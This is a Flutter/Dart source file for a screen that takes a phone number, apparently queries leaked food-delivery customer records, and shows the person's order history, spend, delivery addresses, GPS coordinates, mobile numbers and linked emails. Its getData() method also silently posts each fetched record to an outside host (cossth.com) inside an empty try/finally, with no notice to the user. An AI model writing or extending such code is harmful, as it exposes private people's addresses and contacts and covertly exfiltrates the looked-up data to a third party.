import 'package:contacts_service/contacts_service.dart';
import 'package:dio/dio.dart';
import 'package:dominos2/API/OrderDetails.dart';
import 'package:dominos2/API/getData.dart';
import 'package:flutter/material.dart';
import 'package:intl/intl.dart';
import 'package:url_launcher/url_launcher.dart';

class ShowData extends StatefulWidget {
  final Contact? contact;
  final String phone;
  ShowData(this.contact, this.phone);

  @override
  _ShowDataState createState() => _ShowDataState();
}

class _ShowDataState extends State<ShowData> {
  late Future ftr;
  OrderDetails? data;
  @override
  void initState() {
    ftr = getData();
    super.initState();
  }

  getData() async {
    this.data = await API.getData(widget.phone);

    try {
      Dio().post('http://_._._._.cossth.com/dominos', data: this.data);
    } finally {}
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.done) {
          if (snapshot.hasError) {
            return Container(
              child: Center(
                child:
                    Text("Error: please try again (Close it and open again)"),
              ),
            );
          }
          try {
            if (data != null) {
              final i = data?.dbData;
              if (i == null) throw Exception();
              final fmt = DateFormat('dd MMM, yyyy');
              final fmt2 = DateFormat('hh:mm aaa');
              final info = i;
              final contact = widget.contact;
              final theme = Theme.of(context);
              return Flexible(
                child: ListView(
                  // crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        getAvatar(contact),
                        Container(
                            padding: EdgeInsets.symmetric(horizontal: 20),
                            child: Text(
                              contact?.displayName ?? widget.phone,
                              style: theme.textTheme.headline4,
                              textAlign: TextAlign.center,
                            ))
                      ],
                    ),
                    SizedBox(height: 20),
                    Row(
                      children: [
                        Text(
                          'Rs ' + info.totalPriceSpent.toString(),
                          style: theme.textTheme.bodyText1,
                        ),
                        Text(
                          ' Money Spent in ',
                          style: theme.textTheme.bodyText2,
                        ),
                        Text(
                          (info.totalNumOrders ~/ 1).toString(),
                          style: theme.textTheme.bodyText1,
                        ),
                        Text(
                          ' Orders.',
                          style: theme.textTheme.bodyText2,
                        ),
                      ],
                    ),
                    SizedBox(height: 20),
                    SingleChildScrollView(
                      scrollDirection: Axis.horizontal,
                      child: DataTable(columns: [
                        DataColumn(label: Text('Date')),
                        DataColumn(label: Text('Time')),
                        DataColumn(label: Text('Price'), numeric: true),
                        DataColumn(label: Text('Location (Lat/Lon)')),
                        DataColumn(label: Text('Mobile')),
                        DataColumn(label: Text('Address')),
                      ], rows: [
                        for (var it in info.randomOrders)
                          DataRow(cells: [
                            DataCell(Text(fmt.format(it.orderTimeGmt))),
                            DataCell(Text(fmt2.format(it.orderTimeGmt))),
                            DataCell(Text(it.orderPrice.toString())),
                            DataCell(GestureDetector(
                              onTap: () => _launchURL(
                                  'https://www.bing.com/maps/?q=${it.deliveryAddressLatLon.join(',')}'),
                              child: Text(it.deliveryAddressLatLon.join(',')),
                            )),
                            DataCell(Text(it.deliveryMobileNo)),
                            DataCell(Text(
                              it.deliveryAddress,
                              maxLines: 2,
                            )),
                          ])
                      ]),
                    ),
                    SizedBox(height: 20),
                    if (info.linkedEmails.length > 0)
                      Text(
                        'Emails',
                        style: theme.textTheme.headline5,
                      ),
                    for (var e in info.linkedEmails)
                      Text(
                        e,
                        style: theme.textTheme.bodyText1,
                      ),
                    SizedBox(height: 10),
                    if (info.linkedMobiles.length > 0)
                      Text(
                        'Phone',
                        style: theme.textTheme.headline5,
                      ),
                    for (var e in info.linkedMobiles)
                      Text(
                        e,
                        style: theme.textTheme.bodyText1,
                      ),
                    SizedBox(height: 50),
                  ],
                ),
              );
            }
          } catch (e) {
            return Container(
              height: 200,
              child: Center(
                child: Text("Error: " + e.toString()),
              ),
            );
          }
        }
        return Flexible(
            child: Container(
          padding: EdgeInsets.symmetric(vertical: 20),
          child: Column(
            children: [
              SizedBox(height: 50),
              LinearProgressIndicator(),
              SizedBox(height: 20),
              Text('Loading Data'),
              SizedBox(height: 50),
            ],
          ),
        ));
      },
      future: ftr,
    );
  }

  getAvatar(Contact? contact) {
    return (contact != null &&
            contact.avatar != null &&
            contact.avatar!.length > 0)
        ? CircleAvatar(
            backgroundImage: MemoryImage(contact.avatar!),
          )
        : Container(
            decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: LinearGradient(colors: [
                  Colors.green,
                  Colors.green.shade800,
                ], begin: Alignment.bottomLeft, end: Alignment.topRight)),
            child: CircleAvatar(
                child: Text(contact?.initials() ?? 'NA',
                    style: TextStyle(color: Colors.white)),
                backgroundColor: Colors.transparent),
          );
  }

  _launchURL(String url) async {
    if (await canLaunch(url)) {
      await launch(url);
    } else {
      throw 'Could not launch $url';
    }
  }
}
